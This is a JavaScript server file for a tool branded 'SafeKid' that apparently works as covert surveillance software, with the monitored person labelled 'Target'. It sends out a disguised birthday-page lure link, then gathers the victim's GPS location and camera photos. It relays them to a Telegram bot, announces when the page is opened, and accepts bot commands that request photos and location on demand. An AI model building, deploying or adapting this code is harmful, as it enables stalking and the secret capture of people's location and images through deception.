// SafeKid TG Server v3 — zero dependencies
const http   = require('http');
const https  = require('https');
const crypto = require('crypto');
const fs     = require('fs');
const path   = require('path');

const PORT  = parseInt(process.env.SK_PORT)  || 3000;
const PUB   = process.env.SK_PUBLIC  || path.join(__dirname, 'public');
const BOT   = process.env.BOT_TOKEN  || '';
const CID   = process.env.CHAT_ID    || '';
const PURL  = process.env.PUBLIC_URL || '';

const MIME = {
  '.html':'text/html;charset=utf-8',
  '.js'  :'application/javascript',
  '.css' :'text/css',
  '.ico' :'image/x-icon',
  '.png' :'image/png',
  '.jpg' :'image/jpeg',
};

// ── Telegram ──
function tgPost(method, params) {
  const body = JSON.stringify(params);
  const req  = https.request({
    hostname: 'api.telegram.org',
    path    : '/bot'+BOT+'/'+method,
    method  : 'POST',
    headers : {'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)},
    timeout : 15000,
  }, res => { res.resume(); });
  req.on('error', ()=>{});
  req.on('timeout', ()=>req.destroy());
  req.write(body); req.end();
}

function tgMsg(text) {
  tgPost('sendMessage', {chat_id:CID, text, parse_mode:'HTML'});
}

function tgLoc(lat, lng, name) {
  tgPost('sendVenue', {
    chat_id   : CID,
    latitude  : lat, longitude: lng,
    title     : '📍 Lokasi '+name,
    address   : lat.toFixed(5)+', '+lng.toFixed(5),
  });
}

function tgPhoto(b64, caption) {
  const imgBuf   = Buffer.from(b64.replace(/^data:image\/\w+;base64,/,''), 'base64');
  const boundary = 'SK'+Date.now();
  const CRLF     = '\r\n';
  const head = Buffer.from(
    '--'+boundary+CRLF+
    'Content-Disposition: form-data; name="chat_id"'+CRLF+CRLF+CID+CRLF+
    '--'+boundary+CRLF+
    'Content-Disposition: form-data; name="caption"'+CRLF+CRLF+(caption||'')+CRLF+
    '--'+boundary+CRLF+
    'Content-Disposition: form-data; name="photo"; filename="photo.jpg"'+CRLF+
    'Content-Type: image/jpeg'+CRLF+CRLF
  );
  const tail = Buffer.from(CRLF+'--'+boundary+'--'+CRLF);
  const body = Buffer.concat([head, imgBuf, tail]);
  const req  = https.request({
    hostname: 'api.telegram.org',
    path    : '/bot'+BOT+'/sendPhoto',
    method  : 'POST',
    headers : {'Content-Type':'multipart/form-data; boundary='+boundary,'Content-Length':body.length},
    timeout : 25000,
  }, res => res.resume());
  req.on('error', ()=>{});
  req.on('timeout', ()=>req.destroy());
  req.write(body); req.end();
}

// ── WebSocket ──
function wsEncode(d) {
  const p=Buffer.from(d,'utf8'), l=p.length;
  let h;
  if      (l<126)   { h=Buffer.alloc(2);  h[0]=0x81; h[1]=l; }
  else if (l<65536) { h=Buffer.alloc(4);  h[0]=0x81; h[1]=126; h.writeUInt16BE(l,2); }
  else              { h=Buffer.alloc(10); h[0]=0x81; h[1]=127; h.writeBigUInt64BE(BigInt(l),2); }
  return Buffer.concat([h,p]);
}

class WS {
  constructor(s) {
    this.s=s; this.alive=true; this._h={}; this._b=Buffer.alloc(0);
    s.on('data',  c => { this._b=Buffer.concat([this._b,c]); this._flush(); });
    s.on('close', () => { this.alive=false; this._emit('close'); });
    s.on('error', () => { this.alive=false; this._emit('close'); });
  }
  _flush() {
    while (this._b.length >= 2) {
      const op=this._b[0]&0x0f, masked=(this._b[1]&0x80)!==0;
      let pl=this._b[1]&0x7f, off=2;
      if (pl===126) { if(this._b.length<4) break; pl=this._b.readUInt16BE(2); off=4; }
      else if (pl===127) { if(this._b.length<10) break; pl=Number(this._b.readBigUInt64BE(2)); off=10; }
      if (masked) off+=4;
      if (this._b.length < off+pl) break;
      const mk = masked ? this._b.slice(off-4,off) : null;
      const p  = Buffer.from(this._b.slice(off, off+pl));
      if (masked && mk) for (let i=0;i<p.length;i++) p[i]^=mk[i%4];
      this._b = this._b.slice(off+pl);
      if (op===0x8) { this.s.end(); return; }
      if (op===0x1) this._emit('message', p.toString('utf8'));
    }
  }
  send(d) { if(this.alive) try{ this.s.write(wsEncode(d)); }catch{} }
  close() { this.alive=false; try{ this.s.end(); }catch{} }
  on(e,f) { this._h[e]=f; return this; }
  _emit(e,...a) { if(this._h[e]) this._h[e](...a); }
}

// ── Rooms ──
const rooms = {};
function room(c) { if(!rooms[c]) rooms[c]={loc:null,cam:null,child:null,parents:[]}; return rooms[c]; }
function bcast(list, msg) { const s=JSON.stringify(msg); list.forEach(c=>{if(c?.alive)c.send(s);}); }

let photoCnt=0, locCnt=0, cName='Target', cOnline=false;

function handle(ws) {
  let role=null, code=null;

  ws.on('message', raw => {
    let m; try { m=JSON.parse(raw); } catch { return; }

    if (m.type==='join') {
      role=m.role; code=(m.room||'').toUpperCase().trim();
      if (!code) { ws.close(); return; }
      const r=room(code);
      if (role==='child') {
        if (r.child?.alive) r.child.close();
        r.child=ws; cName=m.childName||'Target';
        ws.send(JSON.stringify({type:'joined',role:'child',room:code}));
        bcast(r.parents, {type:'status',online:true,childName:cName});
        console.log('['+code+'] child: '+cName);
        if (!cOnline) {
          cOnline=true;
          tgMsg('🟢 <b>'+cName+' Membuka Halaman!</b>\n🕐 '+new Date().toLocaleString('id-ID')+(PURL?'\n\n📊 Monitor: '+PURL+'/parent.html':''));
        }
      } else {
        r.parents.push(ws);
        ws.send(JSON.stringify({type:'joined',role:'parent',room:code}));
        if (r.loc) ws.send(JSON.stringify({type:'location',data:r.loc}));
        if (r.cam) ws.send(JSON.stringify({type:'camera',  data:r.cam}));
      }
      return;
    }

    if (!code) return;
    const r=room(code);

    if (m.type==='location' && role==='child') {
      r.loc=m.data; locCnt++;
      bcast(r.parents, {type:'location',data:m.data});
      if (locCnt===1 || locCnt%5===0) {
        const d=m.data, acc=d.accuracy?'±'+d.accuracy.toFixed(0)+'m':'?', spd=d.speed?(d.speed*3.6).toFixed(1)+' km/h':'diam';
        tgLoc(d.lat, d.lng, cName);
        tgMsg('📍 <b>Lokasi '+cName+'</b>\n🌐 <code>'+d.lat.toFixed(6)+', '+d.lng.toFixed(6)+'</code>\n🎯 '+acc+' | 🚗 '+spd+'\n🕐 '+new Date(d.timestamp).toLocaleTimeString('id-ID')+'\n🗺 <a href="https://maps.google.com/?q='+d.lat+','+d.lng+'">Buka Maps</a>');
      }
    }

    if (m.type==='camera' && role==='child') {
      r.cam=m.data; photoCnt++;
      bcast(r.parents, {type:'camera',data:m.data});
      tgPhoto(m.data.image, '📸 '+cName+' | '+new Date(m.data.timestamp).toLocaleString('id-ID')+' | #'+photoCnt);
      console.log('photo #'+photoCnt+' → Telegram');
    }

    if (m.type==='status' && role==='child') {
      bcast(r.parents, {type:'status',...m.data});
    }
  });

  ws.on('close', () => {
    if (!code) return;
    const r=room(code);
    if (role==='child') {
      r.child=null; cOnline=false;
      bcast(r.parents, {type:'status',online:false});
      tgMsg('🔴 <b>'+cName+' Menutup Halaman</b>\n🕐 '+new Date().toLocaleString('id-ID'));
    } else {
      r.parents=r.parents.filter(p=>p!==ws);
    }
  });
}

// ── HTTP ──
const server = http.createServer((req, res) => {
  let u = req.url.split('?')[0];
  if (u==='/' || u==='') u='/index.html';
  const fp = path.resolve(PUB+u);
  if (!fp.startsWith(path.resolve(PUB))) { res.writeHead(403); res.end(); return; }
  fs.readFile(fp, (err, data) => {
    if (err) { res.writeHead(404); res.end('404: '+u); return; }
    res.writeHead(200, {'Content-Type': MIME[path.extname(fp)] || 'text/plain'});
    res.end(data);
  });
});

server.on('upgrade', (req, socket) => {
  const key = req.headers['sec-websocket-key'];
  if (!key) { socket.end(); return; }
  const acc = crypto.createHash('sha1')
    .update(key+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');
  socket.write(
    'HTTP/1.1 101 Switching Protocols\r\n'+
    'Upgrade: websocket\r\nConnection: Upgrade\r\n'+
    'Sec-WebSocket-Accept: '+acc+'\r\n\r\n'
  );
  handle(new WS(socket));
});

// ── Telegram polling ──
let lastId=0;
function poll() {
  const body = JSON.stringify({offset:lastId+1, timeout:25, allowed_updates:['message']});
  const req  = https.request({
    hostname: 'api.telegram.org',
    path    : '/bot'+BOT+'/getUpdates',
    method  : 'POST',
    headers : {'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)},
    timeout : 30000,
  }, res => {
    let d=''; res.on('data',c=>d+=c);
    res.on('end', () => {
      try {
        const j=JSON.parse(d);
        if (j.ok) j.result.forEach(u => {
          lastId=u.update_id;
          const msg=u.message; if (!msg?.text) return;
          const cmd=msg.text.split(' ')[0].toLowerCase();
          const aRoom=Object.values(rooms).find(r=>r.child?.alive);
          if (cmd==='/status'||cmd==='/start')
            tgMsg('📊 <b>SafeKid Status</b>\n\n'+(cOnline?'🟢 '+cName+' Online':'🔴 '+cName+' Offline')+'\n📸 Foto: '+photoCnt+'\n📍 Lokasi: '+locCnt+(PURL?'\n\n🔗 '+PURL+'/parent.html':''));
          if (cmd==='/foto') {
            if (aRoom?.child?.alive) { aRoom.child.send(JSON.stringify({type:'requestPhoto'})); tgMsg('📸 Meminta foto...'); }
            else tgMsg('❌ Target offline');
          }
          if (cmd==='/lokasi') {
            const r2=Object.values(rooms)[0];
            if (r2?.loc) { tgLoc(r2.loc.lat,r2.loc.lng,cName); tgMsg('📍 <b>Lokasi Terakhir</b>\n🌐 <code>'+r2.loc.lat.toFixed(6)+', '+r2.loc.lng.toFixed(6)+'</code>\n🗺 <a href="https://maps.google.com/?q='+r2.loc.lat+','+r2.loc.lng+'">Buka Maps</a>'); }
            else tgMsg('❌ Belum ada lokasi');
          }
          if (cmd==='/help')
            tgMsg('🛡️ <b>SafeKid Commands</b>\n\n/status — Status target\n/foto — Minta foto\n/lokasi — Lokasi terakhir\n/help — Bantuan');
        });
      } catch {}
      setTimeout(poll, 1000);
    });
  });
  req.on('error', ()=>setTimeout(poll,5000));
  req.on('timeout', ()=>{ req.destroy(); setTimeout(poll,1000); });
  req.write(body); req.end();
}

server.listen(PORT, '0.0.0.0', () => {
  console.log('SafeKid v3 ready on port '+PORT);
  if (PURL) tgMsg('🛡️ <b>SafeKid Aktif!</b>\n\n🎂 Link Ulang Tahun:\n<code>'+PURL+'/birthday.html?r=BDAY&n=Nama</code>\n\n/help untuk perintah bot');
  setTimeout(poll, 2000);
});

process.on('uncaughtException', e => console.error('ERR:', e.message));
